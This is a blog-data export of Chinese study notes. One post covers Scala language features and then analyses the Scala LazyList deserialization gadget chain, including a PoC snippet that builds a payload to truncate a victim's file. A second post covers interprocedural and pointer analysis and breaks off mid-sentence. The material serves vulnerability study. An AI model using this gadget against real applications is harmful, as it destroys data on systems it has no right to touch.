定义一个伴生对象Person，有一个apply方法，接受一个name参数，返回一个Person实例\nobject Person &#123;\n  def apply(name: String) = new Person(name)\n&#125;\n\n// 创建一个Person实例，可以直接用Person(\"Alice\")，而不需要用new Person(\"Alice\")\nval alice = Person(\"Alice\")//相当于Person.apply(\"Alice\")\n\n// 打印alice的name属性，输出Alice\nprintln(alice.name)\n\n\n\n\n这里的Person(“Alice”)是在用括号传递参数，就会调用Person的apply方法\n\napply方法定义在伴生类中object Main &#123;\n\n  def main(args: Array[String]): Unit = &#123;\n\n    class Person(val name: String)&#123;\n      //在类中定义apply方法，输出name\n      def apply() :Unit = println(s\"I am $name\")\n    &#125;\n\n    var p= new Person(\"lanb0\")\n    \n    p()//相当于p.apply()\n    //I am lanb0\n  &#125;\n&#125;\n\n\nUnit是一个特殊的类型，表示不返回任何有用的值。类似于Java中的void类型，Unit在方法或函数不需要返回值时使用\n\n特质traitScala语言中，有一个Scala语言中，有一个重要的概念叫做特质(trait)，它类似于Java语言中的接口，但是比接口更加强大和灵活。\n特质(trait)是一种定义了一组抽象或具体的属性和方法的类型，它可以被类(class)或对象(object)扩展(extends)或混入(mix in)。\n特质可以实现多重继承，也就是说，一个类可以继承多个特质，从而获得所有特质中定义的属性和方法。\n使用trait PersonBody &#123;\n  val height: Int\n&#125;\n\n\n它不能被实例化，像java中的接口\n\n扩展单个特质object Main &#123;\n  trait PersonBody &#123;\n    var height: Int\n  &#125;\n  class Person(name : String) extends PersonBody&#123;\n    override var height: Int = 170\n  &#125;\n  def main(args: Array[String]): Unit = &#123;\n    var person = new Person(\"Cloud\")\n    println(person.height)\n    //170\n  &#125;\n&#125;\n\n重写(实现)属性或方法时，需要使用override关键字来修饰\ntrait的方法声明必须被实现\n扩展多个特质object Main &#123;\n  trait PersonBody &#123;\n    var height: Int\n  &#125;\n  trait PersonHobby&#123;\n    var hobbyGame=\"Honor of King : World\"\n    def showHobby():Unit\n  &#125;\n  trait PersonScore&#123;\n    var math=\"150\"\n    def showScore():Unit\n  &#125;\n  class Person(name : String) extends PersonBody with PersonHobby with PersonScore &#123;\n    override var height: Int = 170\n\n    override def showHobby(): Unit = &#123;\n      println(hobbyGame)\n    &#125;\n\n    override def showScore(): Unit = &#123;\n      println(math)\n    &#125;\n  &#125;\n  def main(args: Array[String]): Unit = &#123;\n    var person = new Person(\"Cloud\")\n    person.showHobby()\n    person.showScore()\n  &#125;\n&#125;\n/*\n输出\nHonor of King : World\n150\n*/\n\n\n跟着多个with，扩展多个特质\n\n自身类型self-typeself-type表示一个类或特质依赖于另一个类型，即它必须和另一个类型混入（mixin）才能被实例化。\n\n假设有一个类Cat\n\nclass Cat &#123;\n  val name: String = \"Tom\"\n  val color: String = \"Gray\"\n  def meow(): Unit = println(\"Meow!\")\n&#125;\n\n\n现在想给猫添加一些新的功能，比如说话、唱歌、跳舞\n\ntrait Talkative &#123;\n  def talk(): Unit\n&#125;\n\ntrait Singer &#123;\n  def sing(): Unit\n&#125;\n\ntrait Dancer &#123;\n  def dance(): Unit\n&#125;\n\n\n但是并不是所有的猫都有，假设只有会说话的猫才能唱歌，也就是唱歌依赖于说话\n\ntrait Talkative &#123;\n  def talk(): Unit\n&#125;\n\ntrait Singer &#123;\n  self: Talkative => // 声明自身类型，表示Singer依赖于Talkative\n  def sing(): Unit = &#123;\n    talk() // 可以直接使用Talkative的成员\n    println(\"La la la...\")\n  &#125;\n&#125;\n\ntrait Dancer &#123;\n  self: Singer => // 声明自身类型，表示Dancer依赖于Singer\n  def dance(): Unit = &#123;\n    sing() // 可以直接使用Singer的成员\n    println(\"Shake shake shake...\")\n  &#125;\n&#125;\n\n此时我再新建对象，也就是给猫混入了这些 特质\nval tom = new Cat with Talkative with Singer with Dancer // 创建一个会说话、唱歌、跳舞的猫\ntom.talk() // 输出：Meow!\ntom.sing() // 输出：Meow! La la la...\ntom.dance() // 输出：Meow! La la la... Shake shake shake...\n\n但是如果给猫没有talkative，而是直接Singer，就会报错\nval jerry = new Cat with Singer // 报错：illegal inheritance; self-type Cat with Singer does not conform to Singer's selftype Singer with Talkative\nval lily = new Cat with Dancer // 报错：illegal inheritance; self-type Cat with Dancer does not conform to Dancer's selftype Dancer with Singer\n\n\n单例对象\nClick to see more\n这一部分是我在看payload生成的源码时，新学的知识\n\n\n单例对象在整个应用程序中只有一个实例，不受类的实例化影响，需要将对象定义放在类的外部，或使用 object 关键字来定义一个独立的对象。\n这里给出了一个单例对象的例子\nobject TestScalaObject &#123;\n val TEST_SYMBOL = \"*\"\n def testMethod(x : String) : String = x\n&#125;\n\n如果我对他用scalac编译，就会产生下面的结果\n\n问题：那这个如果反编译之后呢？\nTestScalaObject.class:\npublic final class TestScalaObject extends java.lang.Object&#123;\n    public static final java.lang.String testMethod(java.lang.String);\n    public static final java.lang.String TEST_SYMBOL();\n&#125;\n\nTestScalaObject$.class:\npublic final class TestScalaObject$ extends java.lang.Object implements scala.ScalaObject&#123;\n    public static final TestScalaObject$ MODULE$;\n    public static &#123;&#125;;\n    public java.lang.String TEST_SYMBOL();\n    public java.lang.String testMethod(java.lang.String);\n&#125;\n\n下面来自GPT:\n\nMODULE$ 的存在是为了保持对象的单例性。由于 Scala 对象是单例的，编译器会在伴生类中创建一个静态的、命名为 MODULE$ 的实例，以确保对象始终是单例的。\n\n这样，就通过 TestScalaObject$.MODULE$ 来访问 TestScalaObject 对象的方法和属性。\n\n在例子中，TestScalaObject$.MODULE$ 实际上是 TestScalaObject 对象的实例。通过它，可以访问 TestScalaObject 中定义的成员，如 TEST_SYMBOL 和 testMethod。\n\n\n总结一下，public static final TestScalaObject$ MODULE$; 是一个静态的、命名为 MODULE$ 的对象，它代表了 TestScalaObject 对象的单例实例。它的存在确保了对象的单例性，并允许你通过它访问对象中定义的成员。\nLazylistlazylist是一种惰性求值的列表，列表中的元素只有在需要的时候才会被计算，而不是一开始就全部计算好。这样可以节省内存和时间，也可以表示无限的序列。\n定义\n\n第一部分用var定义了一个值 LazyState\n()表示是个无参构造器\nLazyList.State[A]是返回值\n这就是个匿名函数：val 一个值：() &#x3D;&gt; return\n\nState,head及tail\nState：\n\nstate:\n\nbitmap$0\n来自StackOverflow\n\nClick to see more\nThat’s where the initialization states for lazy vals are stored. When you access a lazy val (or a nested object, which is equivalent), the compiler uses the bitmap field to determine whether it’s already been evaluated.\n\n\n\n就是确定是否值被计算过了，因为head和tail的序列化和反序列化方法不一样\n\n原理\n首先创建一个具有无限个数字1的Lazylist\n\nval ones = LazyList.continually(1)\n\n\n下面这个表示丢弃前0个元素，使用head方法获取剩余list的第一个元素\n\nprintln(ones.drop(0).head)\n//1\nprintln(ones)\n//LazyList(1, &lt;not computed>)\n\n\n问题1：这里为什么会输出not computed？\n\nhead方法调用state.head\n\n\n\n懒加载的state开始初始化\n\n\n\n这里会调用lazyState方法，就是LazyList构造器中的LazyState()，返回的值是下面的State[A]\n\n\nState[A]调用它的head方法\n\n\nhead方法：返回一个元素，这个元素是当前LazyList计算出的第一个元素。\ntail方法：返回一个新的LazyList，除了第一个元素外，其他元素的集合\n\n\n通过上面的流程可以看出lazylist的本质是不停的用方法取值，而不是一开始所有的1存在内存中\n所以LazyList是Not computed，不是计算好的集合\nLazylist的序列化和反序列化\n它是LazyList的序列化代理，代替LazyList进行序列化和反序列化\n\n这些已经计算出来的元素会以一种紧凑的顺序格式进行序列化，然后跟着未计算出来的元素，它们使用标准的Java序列化方式来存储未计算出来的元素的结构\n\n序列化\n\n\n首先调用默认的wirteObject方法，标准的序列化\n然后判断已经计算过的元素，将么个元素序列化\n遇到没计算过的元素，跳出循环\n序列化一个SerializeEnd，表示计算过的元素序列化完了\n将tail，也就是未计算的元素序列化\n\n反序列化\n\n\n首先调用默认的readObject\n初始化一个缓冲区，存储已经计算出来的元素\n判断是否到了序列化的末尾\n如果没有，就添加到Init缓冲区。asInstanceOf是Scala中的一个类型转换操作符，用于将一个对象强制转换为指定的类型。这里就是转换成A类型\n如果到了末尾，就跳出循环\n\n\n将没有计算出来的元素，类型转换为lazylist\n使用++方法连接init和tail\n\n匿名函数 vs 正常函数匿名函数// 定义一个接受两个整数参数并返回它们的和的匿名函数\nval addition: (Int, Int) => Int = (x, y) => x + y\n\n// 使用匿名函数进行计算\nval result = addition(3, 5)\n\n// 打印结果\nprintln(result) // 输出: 8\n\nval addition: (Int, Int) &#x3D;&gt; Int &#x3D; (x, y) &#x3D;&gt; x + y   \n这里的addition是变量名，并不是函数名\n前面看成一部分，后面堪称一部分，也就是定义一个函数，参数类型为Int Int，返回值为Int\n正常函数def add(x: Int, y: Int): Int = &#123;\n  x + y\n\n\n无参匿名函数scala中的无参匿名函数都会被编译器转换为实现了Function0接口的实例对象\n说人话：无参的函数会实现Function0接口，Function0接口中定义了apply()方法，所以在（)的时候，就会调用Function的apply方法\n\n测试无参匿名函数\n\nclass a&#123;\n   object Main &#123;\n      class test(val func:()=>Int)&#123;\n        def show(): Unit = &#123;\n          func()\n        &#125;\n      &#125;\n\t&#125;\n&#125;\n\n\n\n\n对这个代码点击左键，发现它认为func是Function0的apply方法\n\n\n\n\n也就是无参匿名函数确实实现了Function0接口\n\n\n用scalac进行编译scalac a.scala，生成文件如下\n\n\n\n用javap进行反编译，再次印证，func()方法是Function0类型的\n\n\n漏洞分析\nClick to see more\nLazyList反序列化时会调用一个无参的匿名函数来更新LazyList的状态，这个函数可以被控制。因为Scala中的无参匿名函数都实现了Function0接口，也就是可以给LazyList传一个精心构造的函数，该函数只要实现了Function0接口。\n\n\n首先是ObjectInputStream.readObject方法接受到伪造的序列化字节流之后，尝试反序列化LazyList，进而把控制权转交给SerializationProxy类的readObject方法\n\n这里会执行 ++ 方法，接下来会执行prependedAll方法，且该方法是在trait Seq0ps中定义的，LazyList中重写了该方法\n\n\n跳转到LazyList的prependedAll方法\n\n跟进konwIsEmpty方法\n\n跟进IsEmpty方法：\n\n\n这里的eq是比较state和State.Empty是否指向同一个位置\n\n再跟进state字段，发现跳转到了LazyList定义state处：\n\n\n也就是这里会执行lazyState()，而它就是LazyList构造器中接受的方法，发现它实现了Funciton0接口\n\n\n综上所述，我需要找一个实现了Function0接口的函数，把它替换掉\n漏洞利用匿名函数编译后的形式查看poc中的DefaultProviders，看到这样的代码\n\n问题：这里是在用反射，为什么className是一个看不懂的东西，anonfun是啥玩意？\n\nClick to see more\nScala编译器在编译Scala代码时，会将匿名函数转换成Java字节码，这样就可以在Java虚拟机上运行。\n为了与Java兼容，Scala编译器会为每个匿名函数生成一个类，并给这个类一个特殊的名字，通常是anonfun加上一些数字和符号。这个类名的作用是唯一地标识这个匿名函数，以便在运行时调用。\n\n\n$URLInput:表示ProcessBuilderImpl的内部类\n$$anonfun:表示匿名函数的前缀，表示这是一个自动生成的类。\n$$lessinit$greater:是&lt;init&gt;的转义形式，表示这个匿名函数是在构造器中定义的。\n$1:是匿名函数的序号，表示这是第一个匿名函数。\n问题：为什么要这样构造呢？\n举个例子：\nclass a()&#123;\n  def msg(): String = &#123;\n    return \"i am class a\"\n  &#125;\n&#125;\nclass b (name: =>String)//这里注意冒号和等号之间的空格\nclass c(url:a) extends b(url.msg())\n/**\n这行代码的意思是给c的构造器是a类型 接收参数为url,\n给b的构造器传一个函数url.msg()\n*/\n\n\n\n=&gt; 符号表示这是一个按需求值的参数，也称为 call-by-name 参数。这意味着在实际使用时，stream 参数会被按需求进行求值或调用。\n类b的构造函数接受一个按需传递的参数name，该参数的类型是String。当创建b类的实例时，可以在构造函数中传递一个表达式或函数，而不是一个具体的字符串值。只有当name参数在类的方法或属性中被使用时，它才会被求值。\n\n用scalac进行编译\n\n这个红框框的class表示的是url.msg()这个匿名函数\n\nanonfun：匿名，lessinit$greater表示在构造器中定义的函数\n\n注意：只有b中的参数是传名参数时，才会出现红框框的class\n\n因为传名参数处接受的是一个函数，这个函数可以理解成匿名函数\n\n类比上面的关系，如果这样构造，就会调用父类的构造函数中的内容，也就是下面三个均可以利用\n\npoc源码分析\nClick to see more\n这里利用ProcessBuilderImpl的FileOutput\n\n\n首先创建一个1.txt，用绝对路径\n在Main.java中，添加下面的代码\n\nString fileToTruncate = \"1.txt的路径\";\nPayloadGenerator payloadGenerator = new LazyList(DefaultProviders.FILE_OUTPUT);\nboolean append= false;//清空文件\nbyte[] payload = payloadGenerator.generatePayload(fileToTruncate,append);\nString base64= Base64.getEncoder().encodeToString(payload);\nSystem.out.println(base64);\n\nLazyList(不是scala源码中的，是Poc中自己写的)\n\n获取源码中的LazyList，向里面添加writeObjectSource方法\n\n这里作者说添加了一个方法并设置bitmap为false的原因是：想让在真正的？？？\ngeneratePayload：\n这里首先会apply(args)，function0是一个函数，所以会执行这个函数\n\nClick to see more\nFunciton：apply()\n\n如果有一个 Function&lt;Integer, String&gt; 类型的函数对象，表示接受一个整数参数并返回一个字符串结果，那么可以使用 apply 方法来执行函数的逻辑\n\nFunction&lt;Integer, String> function = num -> \"Result: \" + num;\nString result = function.apply(10);\nSystem.out.println(result);  // 输出：Result: 10\n\n\n\n跳转到了fileOutput\n上面的红框框表示一个接受 Object 数组作为输入，并返回一个 Function0 对象的函数\n问题：这里为什么要传一个ProcessBuilder$.class呢？\n\n查看反编译的结果，发现有一个$outer\n\n是编译器自动生成的方法\n$outer 方法是用于返回外部类（ProcessBuilderImpl.OStreamBuilder，Os）的实例\n\n\n而ProcessBuilder$是ProcessBuilder的伴生对象，也就是Object processBuilder，它继承了ProcessBuilderImple，所以传一个ProcessBuilder$.class\n\nend\n执行结束后，返回的就是new FileOutputStream这个函数，此时的Function0就有了这两个参数\n\n执行createList\n\nClick to see more\n问题：为什么fileName是MODULE？\n\n参照前面的单例对象，这里是用来访问Empty内部的方法和属性\n\n:::details Click to see more\n这里设置bitmap$0为true，前面在lazylist中添加了一个方法，那里设置bitmap为false，作者说是想在序列化开始前，才设置为false。但是其实我不太理解为什么。\n\n\n执行序列化\nnewInstance LazyList的序列化代理serializationProxy，开始序列化\n\nVictim\n在victim中，反序列化刚才的结果，最后发现1.txt中的文件真的被清空了\n\n String data1 = \"前面Base64的结果\";\ndeserialize(Base64.getDecoder().decode(data1));\n\n总结至此，终于完成了Scala LazyList反序列化的漏洞分析，撒花❀。\n克服困难的过程很艰辛也很有趣。\n没有前面师傅的博客，我肯定到现在也不明白，也没有勇气从0开始复现。\n十分感谢参考博客中的小白师傅。\n最后，关于java的反序列化，还有很长的路要走，期待可以多多进步，希望明年这个时候，已经加入了W&amp;M，冲冲冲！\n未尽事宜\n学一下到底怎么用反射去获取类，添加方法\npoc中用了classPool 和反射的工具类 ReflectUtil\n\n\n看一下Github上另一篇关于scala lazylist的分析，修漏洞的\n为什么LazyList中是ArraySeq.class？\n\n","slug":"Scala-LazyList反序列化漏洞利用","date":"2023-09-04T14:20:44.000Z","categories_index":"","tags_index":"漏洞分析,Scala,java","author_index":"XyM4ster"},{"id":"6d51a8663bc5dbf1359ee897f7f5225c","title":"Program-Analysis-03","content":"Interprocedural AnalysisMotivation（为什么需要过程间分析呢）问题1：之前学到都是过程内分析，但是肯定会有方法调用，那该怎么办呢？\n\n之前都是会做最保守的假设，也就是最安全的假设\n对于常量分析而言，就假设不是常量\n\n下面的 x y n对于过程内分析(inter procedural)而言，都是nac\n\n为了更好的精度，就需要过程间分析：也就是需要沿着过程间分析的control - flow edges传递数据流信息。\n对于下面的图，最关键的就是call graph\n\nCall Graph ConstructionCall Graph\ncall graph就是一系列call edges的集合，从调用点到他们的目标方法\n\n\nCall Graph Construction for OOPLS（focus on java）\nMethod Calls(Invocation) in Java\nSpecial call处理三种方法： 私有方法、构造函数、父类方法\n\nstatic call和special call都是在编译时，就可以确定了，但是像其他的实例方法，需要在运行时候才能确定\nInstruction：指Java的IR中的指令\nReceiver objects：方法调用对应的实例对象（static方法调用不需要对应实例）。\nTarget methods：表达IR指令到被调用目标方法的映射关系\nNum of target methods：call对应的可能被调用的目标方法的数量。Virtual call与动态绑定和多态实现有关，可以对应多个对象下的重写方法。所以Virtual call的可能对象可能超过1个。\nDeterminacy：指什么时候能够确定这个call的对应方法。Virtual call与多态有关，只能在运行时决定调用哪一个具体方法的实现。其他两种call都和多态机制不相关，编译时刻就可以确定。\n\n 意思也就是：在编译时刻，不能确定传给哪个对象，不能确定是调用父类的方法还是子类的方法。\nMethod Dispatch of Virtual Calls在run-time时，一个virtual call取决于以下两点：\n\nreceived object的类型(也就是o的类型，应该是Class)\n调用点的method signature\n\n\n一个signature是一个方法的identifier\n\n\nclass type：这里是C\nmethod name：foo\ndescriptor：返回类型+参数类型\n\n这里用C.foo(P,Q,R)简写\n接着定义了一个Dispatch(c,m)模拟运行时的方法调用过程\n\n这里的目标是找到m方法并调用\n\n如果c包含一个和m有同样名字和descriprot的非抽象方法 m’(因为只有非抽象的方法才能被调用)\n否则就去c的父类中找\n\nAn Example\n\n\n这里的B表示的是received object的类型\n\n\nClass Hierarchy Analysis(CHA)这个算法的目标是在编译时，根据receiver variable来判断它可能调用哪个类的方法\n\n它需要类的迭代信息\n需要receiver variable的 declared type\n\n\nCall Resolution of CHA这里定义了一个函数Resolve(cs)，通过调用点来判断可能的目标方法\n\n这里分成三类，分别是静态方法，special call(构造器、super、私有方法)，和virtual call\nstatic call\n\n就直接调用就行了\n\nspecial call这里以super方法为例\n\n\n首先获得它的类，\n然后用Dispatch，根据前面学的，Dispatch就是先在当前类找同名方法，如果没有，就找它的父类\n\nvirtual call\n获得receive variable的类型\n然后对它和它的所有子类应用dispatch\n\nAn example\nc.foo()  肯定就是C.foo()\na.foo()    返回结果是 {A.foo()，C.foo()，D.foo()}\nb.foo() 返回结果：{A.foo()，C.foo()，D.foo()}\n\n先对B应用Dispatch，他没有这个方法，就要去它的父类中找，所以是A.foo()\n\n这里我用java测试一下，如果B类中没有这个方法，那是会去找他的父类，这条性质我忘记了 ，就严格按照Dispatch的定义来就行\npublic class B extends A&#123;\n\n    public B() &#123;\n    &#125;\n    public static void main(String[] args) &#123;\n        B b = new B();\n        b.foo();\n    &#125;\n&#125;\npublic class A &#123;\n    public void foo()&#123;\n        System.out.println(\"A的foo调用\");\n    &#125;\n&#125;\n\n\n\n\nFeatures of CHA优点：\n\n快，只考虑receiver variable\n忽略数据流信息\n\nide中用的就是CHA \n\nCall Graph Construction -&gt; Algorithm\nAn Example\nInterprocedural Control-Flow GraphCFG表示一个方法的结构\nICFG就是表示整个程序的结构\nICFG包括所有方法的CFG，再加上两种额外的边\n\nCall edges\nReturn edges：\nreturn sites：紧跟着call site的下一条语句是return site\n\n\n\n\n从call graph中获取这两种边\n\nAn example\n\n这里的小黄是 call-to-return edges，就是从Call site到return site\n它用来传递Local data-flow，比如 a&#x3D;6\n\nInterprocedural Data-Flow Analysis\n\n现在多了两种边，需要多两种transfer\n\nInterprocedural Contant Propagation\n\n\n这里要保留edge transfer的返回结果，比如返回的是b，原来流到这的也是b，所以要kill 原来的b\n\n\n如果是过程内分析(IntraProcedural)，那就会保证一种safe的情况，正如本节课最开始的时候说的，就会对于有call method这种，假设不是常量。\n\n\n这里就会假设addOne的返回值不是常量，所以一直到最后b c都不是常量\n因此就会unprecise\n\n\n\n总结\n前面学的都是一个方法内部的分析，也就是过程内分析，只有CFG\n现在再加两种边，call edege和return edge，他们俩从CG(call graph)中获取，构成了这个的ICFG\nPointer AnalysisProblem of CHA\n\n对于CHA来说，n.get只看Number的类型，所以会返回三个call targets，有2个是false postives，这样对于常量分析来说，返回了 0，1，2，所以是NAC\n\n因此就有了指针分析，可以更准确的找到调用的方法.\n\n会根据n指向的对象来构造调用图，所以只会调用One的get方法(1 call target)，基于这个做常量传播，就是准确的。\n\nPointer Analysis分析的是内存中指向哪个地址\n对于oo语言来说\n\n回答的是一个对象指向哪些对象\n\n是may analysis\n\n对于一个指针指向哪些对象，是一个over-approximation，我们问的问题是一个指针可能指向哪个对象\n\nExample\n问题1： 为什么y指向new B\n\n因为返回的this.b之前被赋值了，变成了指向new B，所以y也指向new B\n\nPointer Analysis and alias Analysis（别名分析）指针分析\n\n一个指针指向哪个对象\n\n别名分析\n\n两个指针指向同一个对象么\n\n\n别名分析的信息可以通过指针分析推导出来\nApplication of Pointer Analysis\nCompiler optimization\nBug detection\nSecurity Analysisi\nCall graph,aliases\n\nKey Factors in Pointer Analysis\nHeap abstraction问题：指针分析时，如何对堆的内存进行建模？\n\n程序动态执行时，如果程序中有循环，就会产生无穷多个对象，这样指针分析就无法终止了？\n\n那如何终止？\n\n用堆抽象，把无穷的对象 抽象成 有限的抽象的对象\n\n\nAllocation-Site Abstraction\n给具体的对象建模时，抽象成他们的创建点\n用这个抽象点去代表具体的对象\n\n\n\n把三次循环的结果，抽象成一个创建点o2\n静态分析就只处理o2，也就是程序中有几个new，静态分析就处理几个对象\n\nContext Sensitivity(上下文敏感 )问题：如何堆调用上下文进行建模?\nContext-sensitive：\n\n会区分不同方法的上下文\n如果一个方法有多个上下文，就都分析\n\n\n\n这种就分析2次\n\n上下文敏感对提升指针分析非常有用。\nContext-insentitive\n\n\n只分析1次\n但是merge data flow，可能会丢失精度\n\nFlow sensitivity问题：如何对指针分析中的control flow建模？下面两种方法\n\n\n该图中，左边是flow-sensitive，右边是flow-insensitive\n\nflow-sensitive：\n\n在每个程序的Location，都维持一个指向关系的map\n下面为什么s指向的值是x 而不是y，我还重新学了一下java的String知识。\n总结来说开始时c.f指向的是常量池中的x，s也指向的是x\n但是c.f现在指向了y，就是常量池中新建了一个y，但是此时s还指向的是刚才的，所以是x\n\n\n\nflow-insensitive\n\n忽略程序流的控制流信息，维持程序中的所有指向\n所以o1.f的所有可能值就是{x,y}\ns指向c.f，所有s的所有可能值也是{x,y}\n\n总结;\n目前java中都使用flow-insensitive\nAnalysis Scope问题：指针分析时应该分析程序中的哪一部分呢？有下面两种方式\n\n\n对于whole-program，左边的蓝色图，分析x&#x3D;o1，，y&#x3D;o1,z&#x3D;o4\n对于Demand-driven，右边的黄图，只需要分析z&#x3D;04就够了\n\nwhole-program\n\n计算程序中所有pointer的指向信息\n\nDemand-driven(需求驱动)\n\n根据specific sites of interest进行分析\n\n总结\n\n选择全程序分析\n\nPointer Analysis in this course\n目前没有研究说 Context-sensitive比Context-insensitive不好\n先学Flow-insensitive，再学Flow-sensitive\nWhole-program可以分析完所有的程序，适用于各种需求\nConcerned Statements指针分析只关注影响指针指向的语句\nPointers in Java会local variable，就会Static field\n会Instance field 就会Array element\n\n\n本地变量\n\nStatic field：C.f  \t\n\nInstance field：x.f   x指向的对象有一个field f\n\nArray element：忽略索引，用一个single field，也就是arr，来指向存储在array中的任何值\n\n\n\nPointer-Affecting Statements只需要关注下面这5种语句，对于很长的语句，简化成3AC\n\nfocus  virtual call\n\n总结\nPointer Analysis\nCHA的问题：对于CHA，找到的call target是一个元组，即所有可能的方法，如果对于常量传播而言，得到的结果就是NAC，因此有了指针分析。只有一个call target\nPointer Analysis：一个指针可能指向哪些对象。 但是这不也是不准确的么\n指针分析分析的是啥？\njava中的指针主要有4类\n本地变量\nstatic field :C.f\nInstance field: x.f\nArray element: array[i]\n\n\n只分析直接影响指针的，pointer-affecting statements，有5种\nNew\nAssign\nx&#x3D;y\n\n\nStore\nx.f&#x3D;y\n\n\nLoad\ny&#x3D;x.f\n\n\nCall\nr&#x3D;x.k(a,…)\n\n\n\n\n\n\n指针分析的关键因素\nHeap abstraction\n把new抽象成创建点\n\n\nContext Sensitivity\n对调用的上下文进行建模\n\n\nFlow sensitivity\n如何对控制流进行建模？也就是是否关注程序的具体顺序\n\n\nAnalysis Scope\n1.分析整个程序\n2.只根据需求进行分析\n\n\n\n\n\n\n\n\nPointer Analysis Foundations （I）Point Analysis: RulesDomains and Notations\nPoints-to relations：理解为一个map\nKey 就是指针  value是相应指针的指针集\nRules\n横线上面的是条件，下面的是结论\nNew\n\n\n用oi表示创建出来的对象，所以让x指向oi，就是把pi加到x的指针集中\n\nAssign\n\n\ny指向一个对象，要让x也指向这个\n\nStore\n\n\n如果x指向oi，y指向oj，就让oi.f指向oj，也就是把oj加到oi.f的指针集中\n\nLoad\n\nx指向oi，oi的f执行oj，那就让y也指向oj\n\nHow to Implement Pointer Analysis指针分析的关键：当pt(x)变化时，把这种变化传播给x的相关指针\n解决方式：\n\n用graph去连接相关的指针\n当Pt(x)改变时，把指针变化的部分传播到 x的后继\n\nPointer Flow Graph(PFG)\n\n一个节点n代表一个变量，或者是一个抽象对象的field\n一条边x–&gt;y，意味着x的指向可能(may analysis)流到y的指向\n\n\n这个图中PFG Edges中的&lt;-，表示流动，意思是y的指针流到x\nPFG Examples根据左边的program，得到右边的图\n\n问题：下图中蓝色圈中为什么不能是c.f?\nc.f只是一个指针表达式，真正的指针是抽象创建点，而且这里其实也表示d.f，所以它只能是个抽象的点\n\n假设现在有一个新的表达式，创建点是j，那么最终会从b一直流到a和e\nImplementing Pointer Analysis\nPFG和指针信息相互依存\n指针分析得到的信息越多，PFG中的边也会越多，也会让指针分析的信息更多\n\n这里我理解会根据左边红色的构建PFG，然后还是假设b点有个指针集pt(b)&#x3D;{oj}，它也需要根据新构建出来的边，继续流动\n\nPointer Analysis：AlgorithmsAlgorithms（该算法目前不设计call method）\nWorklistWL：work list存储要处理的信息，里面是一个个的pair\n\n\noi要被加入到x的指针集中\n\nHandling of New and Assign先处理 new和 assign\n\n第一步：加边\n看红色部分\n首先对于 x &#x3D; new T()\n​\t- 那就是把oi，加入到x的指针集中\n对于 x &#x3D; y\n\n调用AddEdge函数，如果s -&gt; t不属于PFG，就在PFG上加一条边，注意这里的边是流向，而不是指向\n如果pt(s)不等于空，那也就是会流向t，也就是需要在t中，添加s的指针集，让t指向所有s能指向的地方\n\n第二步：处理worklist\n看上面算法的第二部分\n首先会做一个减法，也就是本来已经有的就不用动，只添加一些新的\n\n然后进行propogate\n\n圆圈1真正对指针集 进行了修改，把去重后的加入到n的指针集合中。\n此时对PFG进行遍历，找出n的所有后继节点s（也就是之后n会流向的地方），同样把&lt;s，pts&gt;加入到worklist中，后续进行处理，修改他们的指针集\nDifferential Propagation\n\n\n减少集合的操作量，如果在c处就算出来了，就不用之后每一步都算了\n\nHandling of Store and load\nif n represents a variable x 这句我没理解\n如果对于每个oi，有x.f &#x3D; y 或者 y &#x3D; x.f的语句，就加对应的边，和上面一样\nAlgorithms Review\n\n算法的本质是在修改指针集，和addedge\n两个是相辅相成的，待处理的会放到WL中\n\nAn Example\n用流不敏感来处理\n\n从new开始处理\n处理 x &#x3D; y的情况\n处理WL\n\n\n总结\n\nPointer Analysis foundations\n如何实现指针分析呢？ 关键是当x的指针集改变时，要把它传给和x相关的指针\n用一个graph去连接相关的指针，当pt(x)改变时，把改变传给x的后继\n\n\nPoint Flow Graph(PFG)\n通过指针信息构建PFG，PFG中的边表示流向，a-&gt;b表示a的指针集流到b，也就是在b的指针集中添加a的指向\n\n\n指针分析算法\n对于x &#x3D; new T(),add{x,{oi}}\n对于x&#x3D;y，就AddEdge(y,x)\n处理WL中的指针，和对应的指针集\n取出一个&lt;n,pts&gt;，用pts-ptn，只改变新添加的指针\n用Propagate方法\n将上面的差集加入到ptn中\nPFG中每个n节点的后继s，都把{s,差集}加入到WL中\n\n\n如果n代表一个变量x，也就是它有field\n对于x.f&#x3D;y，就AddEdge(y,oi.f)\n对于y&#x3D;x.f，就AddEge(oi.f,y)\n\n\n\n\nAddEdge(s,t)方法\n在PFG上添加s-&gt;t\n如果pt(s)不为空，就添加&lt;t,pt(s)&gt;到WL中\n\n\n\n\n\n\n\nPointer Analysis with Method CallsCHA：解决call targets通过a的declared type\nPointer Analysis：resolve call targets 基于pt(a)\n以前是根据CHA建call graph,那是会有假边\n现在根据指针分析来建call graph\nRulejvm在进行方法调用的时候，做的4件事\n\nDispatch\n\nReceived Object\n\n参数\n\n返回值\n\n\n\n\n首先x指向oi 调用点接着对oi和k进行Dispatch，目标是找到要调用的方法\n\n找到后，让oi 指向$pt(m_{this})$,也就是传receive object\n\n传参数 也就是把形参aj传给 $m_{pj}$（当前变量中的pj参数）\n\n传返回值，把$m_{ret}$传递给r\n\n\n问题：为什么不在x和this之间连一条边？(也就是黑色虚线为啥不是实线)\n\n\n假设x的指针集中  A B C三个调用点，且A B C三个类满足继承关系，那如果存在边，就会流过去，这也就让每个this的指针集中包括了{new A new B new C}，这显然是不合理的，每个类的this应该只有自己的类\n\n在每次算法执行时，oi是确定的某个对象(唯一的，只有一个)，然后针对这个对象做Dispatch，能够找到唯一的receive object\nInterprocedural Pointer AnalysisCall graph形成一个可达的世界：\n\n在效率上有提升：好处是不可达的方法说明程序中根本就不会用到，所以就不用分析\n\n在精度上有提升：对于不可达的方法，他们有关的指针集都是假的，因为永远也不会用到  \n\nEntry methods在最开始一定是可达的\n\n其他\n\n\nAlgorithms \n\n黄色的部分是新加的\n\n这里的$m^{entry}$方法，就理解成main方法，程序从main开始分析  \n\nRM：reachable methods 可达的方法 \n\nS: S是可达的语句的集合，也就是RM方法中的语句\n\n$S_m$: 方法m中的语句\n\nCG：call graph的边\n\nAddReachable：把新的方法加入到可达的世界中\n\n\nAddReachable啥时候被调用？\n\nentry方法是一开始的，肯定是可达，调用\n发现新的调用边的时候\n\n\n\n前面两行就是把新的方法加入到S集合中\n\n为什么在算法的一开始，不处理load 和 store语句，只处理New 和 assign呢\n因为像new和assign语句，你不需要知道他们的指针信息，就可以直接操作。\n但是对于 x.f &#x3D; y这样的语句，需要知道x的指针集信息，如果y指向oi，x指向oj，需要把y加入到oi.f中，但是此时一开始，x的指针集是空的\nProcessCall：就是在做上面那4件事\n\n 对于每个call site l :  x.k方法：\n\n用Dispatch找到对应的方法m\n把&lt;mthis,{oi}&gt;添加到WL \n如果 l -&gt;m不属于PFG，l是call 